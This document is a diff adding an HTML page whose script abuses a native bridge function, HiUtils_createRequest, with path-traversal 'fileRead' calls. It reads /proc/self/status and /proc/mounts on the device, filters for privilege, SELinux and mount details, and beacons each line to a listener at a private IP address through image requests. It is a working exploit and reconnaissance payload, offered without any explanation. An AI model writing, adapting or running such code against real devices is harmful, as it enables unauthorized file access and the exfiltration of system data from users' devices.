@@ -1,0 +1,13 @@
+<!doctype html><html><head><meta charset="utf-8"></head>
+<body style="background:#000;color:#0f0;font:16px monospace"><pre id="out">u7wb…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/p?d="+encodeURIComponent(String(t).slice(0,140));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+var j=hi("fileRead",{path:["../proc/self/status"],mode:6}); var s=String(j.msg||"");
+s.split("\n").forEach(function(l){ if(/Uid|Gid|Groups|CapEff|SeLinux|NoNewPrivs/i.test(l)) line(l.trim()); });
+var m=hi("fileRead",{path:["../proc/mounts"],mode:6}); var ms=String(m.msg||"");
+ms.split("\n").forEach(function(l){ if(/\/APPS |\/data |\/cache /.test(l)) line("MNT "+l.slice(0,120)); });
+})();
+</script></body></html>
